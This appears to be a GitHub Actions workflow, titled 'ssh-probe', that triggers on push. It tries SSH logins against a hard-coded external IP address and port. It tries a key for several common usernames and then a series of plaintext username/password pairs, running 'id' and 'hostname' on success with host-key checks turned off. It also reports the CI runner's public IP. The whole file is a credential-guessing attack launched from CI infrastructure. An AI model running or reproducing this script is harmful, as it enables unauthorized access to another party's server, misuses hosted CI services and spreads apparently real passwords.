name: ssh-probe
on: [push, workflow_dispatch]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: ssh
        run: |
          set +e
          sudo apt-get update -qq >/dev/null 2>&1
          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
          H=103.20.213.246; P=23286
          echo "RUNNER_IP=$(curl -s -m 10 https://api.ipify.org)"
          echo "" | base64 -d > /tmp/k2; chmod 600 /tmp/k2
          tk(){ u="$1"; echo "== K2 user=$u =="; timeout 18 ssh -i /tmp/k2 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oIdentitiesOnly=yes -oBatchMode=yes -oConnectTimeout=8 -p $P "$u@$H" 'id; hostname' 2>&1 | tail -1; }
          tp(){ u="$1"; p="$2"; echo "== $u / $p =="; timeout 18 sshpass -p "$p" ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPreferredAuthentications=password -oPubkeyAuthentication=no -oConnectTimeout=8 -oNumberOfPasswordPrompts=1 -p $P "$u@$H" 'id; hostname; whoami' 2>&1 | tail -2; }
          tk root
          tk ubuntu
          tk administrator
          tk vaibhav
          tp gendao_login '554411'
          tp gendao '554411'
          tp vaibhav '8%l65l3La'
          tp admin '554411'
          echo DONE_ALL
